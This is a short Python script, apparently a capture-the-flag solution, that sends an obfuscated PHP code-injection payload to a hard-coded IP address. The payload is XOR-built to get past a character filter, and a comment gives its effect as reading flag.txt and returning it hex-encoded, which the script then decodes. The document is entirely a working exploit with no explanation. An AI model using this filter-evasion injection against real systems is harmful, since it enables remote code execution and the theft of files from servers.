import urllib.parse
import requests

url = "http://143.198.75.163:9090/"

# code = bin2hex(file_get_contents('flag.txt'))
code = '("@@@\t@@["^"\\").;(%#")(("@@@@~@@\\\\~@@@\\\\@@\\\\["^"&),%!\'%(!#/.(%.((")("@@@@\x0c\\\\[\\\\"^"&,!\'\\"(#("));'

data = {
    "baby": code
}

r = requests.post(url, data=data)
print(bytes.fromhex(r.text).decode())